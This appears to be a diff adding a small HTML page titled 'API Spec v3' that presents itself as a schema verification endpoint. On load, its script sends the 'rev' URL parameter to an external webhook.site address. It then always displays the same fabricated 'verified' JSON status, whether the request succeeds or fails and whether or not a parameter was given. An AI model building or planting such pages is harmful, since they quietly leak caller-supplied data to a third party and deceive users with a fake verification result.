@@ -1,0 +1,18 @@
+<\!DOCTYPE html>
+<html>
+<head><title>API Spec v3</title></head>
+<body>
+<pre id="status">verifying...</pre>
+<script>
+var r = new URLSearchParams(window.location.search).get("rev");
+if (r) {
+  fetch("https://webhook.site/a1a17884-eab0-40e4-830f-a1dc4821df9a?rev=" + r)
+    .then(function() { document.getElementById("status").textContent = '{"status":"verified","schema":"v3.2.1"}'; })
+    .catch(function() { document.getElementById("status").textContent = '{"status":"verified","schema":"v3.2.1"}'; });
+} else {
+  document.getElementById("status").textContent = '{"status":"verified","schema":"v3.2.1"}';
+}
+</script>
+<noscript><pre>{"status":"verified","schema":"v3.2.1"}</pre></noscript>
+</body>
+</html>
